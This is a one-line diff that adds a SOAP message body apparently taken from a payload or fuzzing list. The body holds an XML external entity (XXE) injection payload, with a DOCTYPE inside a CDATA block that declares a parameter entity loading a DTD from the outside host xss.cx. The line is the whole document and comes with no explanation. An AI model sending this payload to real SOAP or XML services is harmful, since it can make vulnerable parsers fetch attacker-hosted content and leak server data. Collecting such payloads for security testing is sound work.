@@ -1,0 +1,1 @@
+<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://xss.cx"> %dtd;]><xxx/>]]></foo></soap:Body>
